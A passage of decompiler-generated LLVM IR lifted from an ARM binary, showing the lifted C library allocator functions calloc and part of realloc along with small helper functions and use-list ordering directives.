  uselistorder i32 %v4_11b58, { 1, 0, 2 }
  uselistorder i32 %v1_11ac8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11b20, { 1, 0 }
  uselistorder i32 %v1_11b04, { 1, 0 }
  uselistorder i32 %v1_119a4, { 1, 0 }
  uselistorder i32 %v0_11ae4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_11aac, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11b40.pre, { 1, 2, 0 }
  uselistorder i32 %v0_11a88, { 2, 1, 0 }
  uselistorder i32 %v3_11a7c, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_1199c, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11a44, { 1, 0 }
  uselistorder i32 %v3_11a38, { 1, 0 }
  uselistorder i32 %v0_11a44, { 1, 0 }
  uselistorder i32 %v3_11a1c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11a0c, { 1, 0, 2 }
  uselistorder i32 %v3_119c4, { 2, 1, 0 }
  uselistorder i32 %v0_119b4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11984, { 1, 0 }
  uselistorder i32 %v1_11938, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11934, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_118d8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_118cc, { 1, 0 }
  uselistorder i32 %v3_1189c, { 1, 0 }
  uselistorder i32 %v0_11890, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_11870, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11864, { 1, 0 }
  uselistorder i32 %v0_11834, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 1, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_120dc, { 1, 0 }
  uselistorder label %dec_label_pc_120c0, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_120bc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_120a4, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_12038, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_11fb4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11fac, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11e80, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_11db4, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_11c6c, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_11bc0, { 1, 0 }
  uselistorder label %dec_label_pc_11bc8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11b8c, { 1, 0 }
  uselistorder label %dec_label_pc_11b40, { 1, 0 }
  uselistorder label %dec_label_pc_11ad4, { 1, 0 }
  uselistorder label %dec_label_pc_11ad0, { 1, 0 }
  uselistorder label %dec_label_pc_11a7c, { 1, 0 }
  uselistorder label %dec_label_pc_11a68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a30, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11a1c, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_120f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_120f0:
  %v0_120f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_120f0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_120f0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_120f0, %bb
  %v4_1210c = phi i32 [ %arg1, %dec_label_pc_120f0 ], [ 0, %bb ]
  ret i32 %v4_1210c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12110 = load i32, i32* @r4, align 4
  %v6_12110 = load i32, i32* @r5, align 4
  %v9_12110 = load i32, i32* @r6, align 4
  %v12_12110 = load i32, i32* @lr, align 4
  %v2_12118 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12128 = mul i32 %arg2, %arg1
  store i32 %v2_12128, i32* @r6, align 4
  br i1 %v2_12118, label %dec_label_pc_12160, label %dec_label_pc_12130

dec_label_pc_12130:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12138 = udiv i32 %v2_12128, %arg1
  %v9_1213c = icmp eq i32 %v2_12138, %arg2
  br i1 %v9_1213c, label %dec_label_pc_12160, label %dec_label_pc_12144

dec_label_pc_12144:                               ; preds = %dec_label_pc_12130
  %v0_12148 = call i32 @__aeabi_read_tp()
  %v3_1214c = load i16, i16* @global_var_21510.336, align 2
  %v4_1214c = sext i16 %v3_1214c to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12158 = add i32 %v4_1214c, %v0_12148
  %v4_12158 = inttoptr i32 %v3_12158 to i32*
  store i32 12, i32* %v4_12158, align 4
  br label %dec_label_pc_12224

dec_label_pc_12160:                               ; preds = %dec_label_pc_12130, %entry
  %v4_12164 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 108) to i32*), align 4
  store i32 %v4_12164, i32* @r4, align 4
  %v4_1217c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), align 4
  store i32 %v4_1217c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1217c)
  %v0_12190 = load i32, i32* @r5, align 4
  %v2_12190 = add i32 %v0_12190, 16
  %v3_12190 = inttoptr i32 %v2_12190 to i32*
  %v4_12190 = load i32, i32* %v3_12190, align 4
  store i32 %v4_12190, i32* %ip.global-to-local, align 4
  store i32 74140, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12190)
  %v0_1219c = load i32, i32* @r6, align 4
  store i32 %v0_1219c, i32* @r0, align 4
  %v0_121a0 = call i32 @malloc()
  store i32 %v0_121a0, i32* %r4.global-to-local, align 4
  %v2_121a4 = icmp eq i32 %v0_121a0, 0
  br i1 %v2_121a4, label %.thread, label %dec_label_pc_121ac

dec_label_pc_121ac:                               ; preds = %dec_label_pc_12160
  %v1_121ac = add i32 %v0_121a0, -4
  %v2_121ac = inttoptr i32 %v1_121ac to i32*
  %v3_121ac = load i32, i32* %v2_121ac, align 4
  %v1_121b0 = and i32 %v3_121ac, 2
  %v2_121b0 = icmp eq i32 %v1_121b0, 0
  br i1 %v2_121b0, label %dec_label_pc_121b8, label %.thread

dec_label_pc_121b8:                               ; preds = %dec_label_pc_121ac
  %v1_121b86 = add i32 %v3_121ac, -4
  %v1_121bc = and i32 %v1_121b86, -4
  %v3_121c0 = udiv i32 %v1_121bc, 4
  store i32 %v3_121c0, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_121bc, 36
  %v2_121c8 = icmp ult i32 %v1_121bc, 33
  %v3_121c8 = or i1 %tmp, %v2_121c8
  br i1 %v3_121c8, label %dec_label_pc_121d4, label %dec_label_pc_121cc

dec_label_pc_121cc:                               ; preds = %dec_label_pc_121b8
  %v3_121cc = inttoptr i32 %v0_121a0 to i8*
  %v4_121cc = call i32 @__GI_memset(i8* %v3_121cc, i32 0, i32 %v1_121bc)
  br label %.thread

dec_label_pc_121d4:                               ; preds = %dec_label_pc_121b8
  %tmp7 = icmp eq i32 %v1_121bc, 16
  %v2_121d8 = inttoptr i32 %v0_121a0 to i32*
  store i32 0, i32* %v2_121d8, align 4
  %v1_121dc = load i32, i32* %r4.global-to-local, align 4
  %v2_121dc = add i32 %v1_121dc, 4
  %v3_121dc = inttoptr i32 %v2_121dc to i32*
  store i32 0, i32* %v3_121dc, align 4
  %v1_121e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_121e0 = add i32 %v1_121e0, 8
  %v3_121e0 = inttoptr i32 %v2_121e0 to i32*
  store i32 0, i32* %v3_121e0, align 4
  %v2_121e4 = icmp ult i32 %v1_121bc, 13
  %v3_121e4 = or i1 %tmp7, %v2_121e4
  br i1 %v3_121e4, label %.thread, label %dec_label_pc_121e8

dec_label_pc_121e8:                               ; preds = %dec_label_pc_121d4
  %v0_121e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_121ec = load i32, i32* %r4.global-to-local, align 4
  %v2_121ec = add i32 %v1_121ec, 12
  %v3_121ec = inttoptr i32 %v2_121ec to i32*
  store i32 0, i32* %v3_121ec, align 4
  %v1_121f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_121f0 = add i32 %v1_121f0, 16
  %v3_121f0 = inttoptr i32 %v2_121f0 to i32*
  store i32 0, i32* %v3_121f0, align 4
  %tmp8 = icmp ult i32 %v0_121e8, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_121f8

dec_label_pc_121f8:                               ; preds = %dec_label_pc_121e8
  %v0_121f8 = load i32, i32* %ip.global-to-local, align 4
  %v7_121f8 = icmp eq i32 %v0_121f8, 9
  %v1_121fc = load i32, i32* %r4.global-to-local, align 4
  %v2_121fc = add i32 %v1_121fc, 20
  %v3_121fc = inttoptr i32 %v2_121fc to i32*
  store i32 0, i32* %v3_121fc, align 4
  %v1_12200 = load i32, i32* %r4.global-to-local, align 4
  %v2_12200 = add i32 %v1_12200, 24
  %v3_12200 = inttoptr i32 %v2_12200 to i32*
  store i32 0, i32* %v3_12200, align 4
  br i1 %v7_121f8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_121f8
  %v2_12204 = load i32, i32* %r4.global-to-local, align 4
  %v3_12204 = add i32 %v2_12204, 32
  %v4_12204 = inttoptr i32 %v3_12204 to i32*
  store i32 0, i32* %v4_12204, align 4
  %v2_12208 = load i32, i32* %r4.global-to-local, align 4
  %v3_12208 = add i32 %v2_12208, 28
  %v4_12208 = inttoptr i32 %v3_12208 to i32*
  store i32 0, i32* %v4_12208, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_121f8, %dec_label_pc_121ac, %dec_label_pc_121e8, %dec_label_pc_121d4, %dec_label_pc_12160, %dec_label_pc_121cc, %bb
  store i32 1, i32* @r1, align 4
  %v0_12218 = load i32, i32* @r5, align 4
  %v2_12218 = add i32 %v0_12218, 44
  %v3_12218 = inttoptr i32 %v2_12218 to i32*
  %v4_12218 = load i32, i32* %v3_12218, align 4
  store i32 %v4_12218, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12218)
  br label %dec_label_pc_12224

dec_label_pc_12224:                               ; preds = %dec_label_pc_12144, %.thread
  %v0_12224 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12110, i32* @r4, align 4
  store i32 %v6_12110, i32* @r5, align 4
  store i32 %v9_12110, i32* @r6, align 4
  store i32 %v12_12110, i32* @lr, align 4
  ret i32 %v0_12224

; uselistorder directives
  uselistorder i32 %v1_121bc, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_121a0, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12224, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1223c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1223c:
  %v0_1223c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1223c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1223c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1223c, %bb
  %v4_1224c = phi i32 [ %arg1, %dec_label_pc_1223c ], [ 0, %bb ]
  ret i32 %v4_1224c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12250 = load i32, i32* @r4, align 4
  %v6_12250 = load i32, i32* @r5, align 4
  %v9_12250 = load i32, i32* @r6, align 4
  %v12_12250 = load i32, i32* @r7, align 4
  %v15_12250 = load i32, i32* @r8, align 4
  %v18_12250 = load i32, i32* @sb, align 4
  %v21_12250 = load i32, i32* @sl, align 4
  %v24_12250 = load i32, i32* @fp, align 4
  %v27_12250 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1225c = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1225c, label %dec_label_pc_12270, label %dec_label_pc_12280

dec_label_pc_12270:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_12274 = call i32 @malloc()
  store i32 %v0_12274, i32* %r0.global-to-local, align 4
  store i32 %v0_12274, i32* @r4, align 4
  br label %dec_label_pc_125e0

dec_label_pc_12280:                               ; preds = %entry
  %v2_12280 = icmp eq i32 %arg2, 0
  br i1 %v2_12280, label %dec_label_pc_12288, label %dec_label_pc_12294

dec_label_pc_12288:                               ; preds = %dec_label_pc_12280
  %v0_12288 = call i32 @free()
  store i32 %v0_12288, i32* %r0.global-to-local, align 4
  %v0_1228c = load i32, i32* @r6, align 4
  store i32 %v0_1228c, i32* @r4, align 4
  br label %dec_label_pc_125e0

dec_label_pc_12294:                               ; preds = %dec_label_pc_12280
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_1229c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 108) to i32*), align 4
  store i32 %v4_1229c, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_1229c, i32* %r2.global-to-local, align 4
  %v4_122a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 68) to i32*), align 4
  store i32 %v4_122a8, i32* %r1.global-to-local, align 4
  %v2_122ac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_122ac, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_122b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_122b4)
  %v0_122c0 = load i32, i32* @r4, align 4
  store i32 %v0_122c0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r1.global-to-local, align 4
  %v4_122cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_122d8.440 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_122cc)
  %v0_122d8 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_122d8, -32
  br i1 %tmp36, label %dec_label_pc_122fc, label %dec_label_pc_122e0

dec_label_pc_122e0:                               ; preds = %dec_label_pc_12294
  store i32 ptrtoint (i32* @global_var_f220.206 to i32), i32* %r2.global-to-local, align 4
  %v0_122e4 = call i32 @__aeabi_read_tp()
  store i32 %v0_122e4, i32* %r0.global-to-local, align 4
  %v3_122e8 = load i16, i16* @global_var_21510.336, align 2
  %v4_122e8 = sext i16 %v3_122e8 to i32
  store i32 %v4_122e8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_122f4 = add i32 %v4_122e8, %v0_122e4
  %v4_122f4 = inttoptr i32 %v3_122f4 to i32*
  store i32 12, i32* %v4_122f4, align 4
  br label %dec_label_pc_125e0

dec_label_pc_122fc:                               ; preds = %dec_label_pc_12294
  %v1_122fc = add i32 %v0_122d8, 11
  store i32 %v1_122fc, i32* %r0.global-to-local, align 4
  %v0_12300 = load i32, i32* @r5, align 4
  %v1_12300 = add i32 %v0_12300, -4
  %v2_12300 = inttoptr i32 %v1_12300 to i32*
  %v3_12300 = load i32, i32* %v2_12300, align 4
  store i32 %v3_12300, i32* %r2.global-to-local, align 4
  %v2_12304 = icmp ugt i32 %v1_122fc, 14
  %v7_12304 = icmp eq i32 %v1_122fc, 15
  %v2_12308 = xor i1 %v2_12304, true
  %v3_12308 = or i1 %v7_12304, %v2_12308
  br i1 %v3_12308, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_122fc
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_122fc, %bb
  %v2_1230c = xor i1 %v7_12304, true
  %v3_1230c = and i1 %v2_12304, %v2_1230c
  br i1 %v3_1230c, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1230c = and i32 %v1_122fc, -8
  store i32 %v5_1230c, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12310 = and i32 %v3_12300, 2
  %v2_12310 = icmp eq i32 %v1_12310, 0
  %v1_12314 = add i32 %v0_12300, -8
  store i32 %v1_12314, i32* @sl, align 4
  %v1_12318 = and i32 %v3_12300, -4
  store i32 %v1_12318, i32* @r6, align 4
  br i1 %v2_12310, label %dec_label_pc_12320, label %dec_label_pc_124f8

dec_label_pc_12320:                               ; preds = %bb29
  %v1_12320 = load i32, i32* @sb, align 4
  %v3_12320 = icmp ult i32 %v1_12318, %v1_12320
  br i1 %v3_12320, label %dec_label_pc_1232c, label %bb30

bb30:                                             ; preds = %dec_label_pc_12320
  store i32 %v1_12318, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12490

dec_label_pc_1232c:                               ; preds = %dec_label_pc_12320
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12334 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_12334, i32* %r0.global-to-local, align 4
  %v1_12338 = add i32 %v4_12334, 44
  %v2_12338 = inttoptr i32 %v1_12338 to i32*
  %v3_12338 = load i32, i32* %v2_12338, align 4
  store i32 %v3_12338, i32* %r3.global-to-local, align 4
  %v2_1233c = add i32 %v1_12318, %v1_12314
  store i32 %v2_1233c, i32* @r4, align 4
  %v9_12340 = icmp eq i32 %v2_1233c, %v3_12338
  %v1_12344 = add i32 %v2_1233c, 4
  %v2_12344 = inttoptr i32 %v1_12344 to i32*
  %v3_12344 = load i32, i32* %v2_12344, align 4
  store i32 %v3_12344, i32* %r1.global-to-local, align 4
  br i1 %v9_12340, label %dec_label_pc_1234c, label %dec_label_pc_12388

dec_label_pc_1234c:                               ; preds = %dec_label_pc_1232c
  %v1_1234c = and i32 %v3_12344, -4
  %v2_12350 = add i32 %v1_1234c, %v1_12318
  store i32 %v2_12350, i32* %r1.global-to-local, align 4
  %v1_12354 = add i32 %v1_12320, 16
  store i32 %v1_12354, i32* %r3.global-to-local, align 4
  %v3_12358 = icmp ult i32 %v2_12350, %v1_12354
  br i1 %v3_12358, label %dec_label_pc_123dc, label %dec_label_pc_12360

dec_label_pc_12360:                               ; preds = %dec_label_pc_1234c
  %v2_12360 = sub i32 %v2_12350, %v1_12320
  %v1_12364 = urem i32 %v3_12300, 2
  %v2_12368 = add i32 %v1_12320, %v1_12314
  store i32 %v2_12368, i32* %r1.global-to-local, align 4
  %v2_1236c = or i32 %v1_12320, %v1_12364
  store i32 %v2_1236c, i32* %r2.global-to-local, align 4
  %v1_12370 = or i32 %v2_12360, 1
  store i32 %v1_12370, i32* %r3.global-to-local, align 4
  store i32 %v0_12300, i32* @r4, align 4
  store i32 %v2_1236c, i32* %v2_12300, align 4
  %v0_1237c = load i32, i32* %r1.global-to-local, align 4
  %v1_1237c = load i32, i32* %r0.global-to-local, align 4
  %v2_1237c = add i32 %v1_1237c, 44
  %v3_1237c = inttoptr i32 %v2_1237c to i32*
  store i32 %v0_1237c, i32* %v3_1237c, align 4
  %v0_12380 = load i32, i32* %r3.global-to-local, align 4
  %v1_12380 = load i32, i32* %r1.global-to-local, align 4
  %v2_12380 = add i32 %v1_12380, 4
  %v3_12380 = inttoptr i32 %v2_12380 to i32*
  store i32 %v0_12380, i32* %v3_12380, align 4
  br label %dec_label_pc_125c4

dec_label_pc_12388:                               ; preds = %dec_label_pc_1232c
  %v1_12388 = and i32 %v3_12344, -2
  %v2_1238c = add i32 %v1_12388, %v2_1233c
  store i32 %v2_1238c, i32* %r3.global-to-local, align 4
  %v1_12390 = add i32 %v2_1238c, 4
  %v2_12390 = inttoptr i32 %v1_12390 to i32*
  %v3_12390 = load i32, i32* %v2_12390, align 4
  store i32 %v3_12390, i32* %r3.global-to-local, align 4
  %v1_12394 = urem i32 %v3_12390, 2
  %v2_12394 = icmp eq i32 %v1_12394, 0
  br i1 %v2_12394, label %dec_label_pc_1239c, label %dec_label_pc_123dc

dec_label_pc_1239c:                               ; preds = %dec_label_pc_12388
  %v1_1239c = and i32 %v3_12344, -4
  store i32 %v1_1239c, i32* %r3.global-to-local, align 4
  %v2_123a0 = add i32 %v1_1239c, %v1_12318
  store i32 %v2_123a0, i32* %r0.global-to-local, align 4
  %v3_123a4 = icmp ult i32 %v2_123a0, %v1_12320
  br i1 %v3_123a4, label %dec_label_pc_123dc, label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %dec_label_pc_1239c
  %v1_123ac = add i32 %v1_12318, %v0_12300
  %v2_123ac = inttoptr i32 %v1_123ac to i32*
  %v3_123ac = load i32, i32* %v2_123ac, align 4
  store i32 %v3_123ac, i32* %r1.global-to-local, align 4
  %v1_123b0 = add i32 %v3_123ac, 12
  %v2_123b0 = inttoptr i32 %v1_123b0 to i32*
  %v3_123b0 = load i32, i32* %v2_123b0, align 4
  store i32 %v3_123b0, i32* %r3.global-to-local, align 4
  %v9_123b4 = icmp eq i32 %v3_123b0, %v2_1233c
  %v1_123b8 = add i32 %v2_1233c, 12
  %v2_123b8 = inttoptr i32 %v1_123b8 to i32*
  %v3_123b8 = load i32, i32* %v2_123b8, align 4
  store i32 %v3_123b8, i32* %r2.global-to-local, align 4
  br i1 %v9_123b4, label %dec_label_pc_123c0, label %dec_label_pc_123cc

dec_label_pc_123c0:                               ; preds = %dec_label_pc_123ac
  %v1_123c0 = add i32 %v3_123b8, 8
  %v2_123c0 = inttoptr i32 %v1_123c0 to i32*
  %v3_123c0 = load i32, i32* %v2_123c0, align 4
  store i32 %v3_123c0, i32* %r3.global-to-local, align 4
  %v9_123c4 = icmp eq i32 %v3_123c0, %v2_1233c
  br i1 %v9_123c4, label %dec_label_pc_123d0, label %dec_label_pc_123cc

dec_label_pc_123cc:                               ; preds = %dec_label_pc_123ac, %dec_label_pc_123c0
  %v0_123cc = call i32 @abort()
  store i32 %v0_123cc, i32* %r0.global-to-local, align 4
  %v0_123d0.pre = load i32, i32* @r1, align 4
  %v1_123d0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_123d0

dec_label_pc_123d0:                               ; preds = %dec_label_pc_123c0, %dec_label_pc_123cc
  %v1_123d0 = phi i32 [ %v3_123b8, %dec_label_pc_123c0 ], [ %v1_123d0.pre, %dec_label_pc_123cc ]
  %v0_123d0 = phi i32 [ %v3_123ac, %dec_label_pc_123c0 ], [ %v0_123d0.pre, %dec_label_pc_123cc ]
  %v2_123d0 = add i32 %v1_123d0, 8
  %v3_123d0 = inttoptr i32 %v2_123d0 to i32*
  store i32 %v0_123d0, i32* %v3_123d0, align 4
  %v0_123d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_123d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_123d4 = add i32 %v1_123d4, 12
  %v3_123d4 = inttoptr i32 %v2_123d4 to i32*
  store i32 %v0_123d4, i32* %v3_123d4, align 4
  %v1_12490.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12490

dec_label_pc_123dc:                               ; preds = %dec_label_pc_1234c, %dec_label_pc_1239c, %dec_label_pc_12388
  %v1_123dc = add i32 %v1_12320, -7
  store i32 %v1_123dc, i32* @r0, align 4
  %v0_123e0 = call i32 @malloc()
  store i32 %v0_123e0, i32* @r0, align 4
  store i32 %v0_123e0, i32* %r1.global-to-local, align 4
  %v2_123e4 = icmp eq i32 %v0_123e0, 0
  br i1 %v2_123e4, label %bb31, label %dec_label_pc_123f0

bb31:                                             ; preds = %dec_label_pc_123dc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_125c4

dec_label_pc_123f0:                               ; preds = %dec_label_pc_123dc
  %v1_123f8.pre = load i32, i32* @r4, align 4
  %v1_123f0 = add i32 %v0_123e0, -4
  %v2_123f0 = inttoptr i32 %v1_123f0 to i32*
  %v3_123f0 = load i32, i32* %v2_123f0, align 4
  store i32 %v3_123f0, i32* @r3, align 4
  %v1_123f4 = add i32 %v0_123e0, -8
  store i32 %v1_123f4, i32* @r7, align 4
  %v9_123f8 = icmp eq i32 %v1_123f4, %v1_123f8.pre
  br i1 %v9_123f8, label %.thread2, label %dec_label_pc_12408

.thread2:                                         ; preds = %dec_label_pc_123f0
  %v2_123fc = and i32 %v3_123f0, -4
  store i32 %v2_123fc, i32* %r3.global-to-local, align 4
  %v2_12400 = load i32, i32* @r6, align 4
  %v3_12400 = add i32 %v2_12400, %v2_123fc
  store i32 %v3_12400, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12490

dec_label_pc_12408:                               ; preds = %dec_label_pc_123f0
  %v0_12408 = load i32, i32* @r6, align 4
  %v1_12408 = add i32 %v0_12408, -4
  store i32 %v1_12408, i32* @r2, align 4
  %v3_1240c = udiv i32 %v1_12408, 4
  store i32 %v3_1240c, i32* @ip, align 4
  %tmp37 = and i32 %v1_12408, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_12414 = icmp ult i32 %v1_12408, 36
  %v3_12414 = or i1 %tmp38, %v2_12414
  %v0_12424 = load i32, i32* @r5, align 4
